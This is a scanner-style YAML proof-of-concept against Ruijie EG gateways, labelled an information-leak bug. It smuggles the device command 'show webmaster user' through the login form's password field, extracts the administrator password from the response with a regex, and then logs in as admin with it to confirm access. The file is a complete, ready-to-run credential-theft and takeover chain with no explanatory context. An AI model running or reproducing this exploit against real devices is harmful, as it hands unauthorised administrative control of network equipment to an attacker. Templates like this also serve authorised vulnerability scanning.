id: poc-yaml-ruijie-eg-info-leak
info:
  name: Ruijie Eg 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: Ruijie EG
  reference: []
  description: null
variables: {}
transport: http
requests:
- method: POST
  path: /login.php
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: username=admin&password=admin?show+webmaster+user
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(headers, "content-type") && contains(headers,
    "text/json")
  output:
  - regex_match(body,"{\"data\":\".*admin\\s?(?P<password>[^\\\\\"]*)")
- method: POST
  path: /login.php
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: username=admin&password={{.password}}
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(headers, "content-type") && contains(headers,
    "text/json") && contains(headers, "Set-Cookie") && contains(headers, "user=admin")
    && contains(body, "{\"data\":\"0\",\"status\":1}")
  output: []
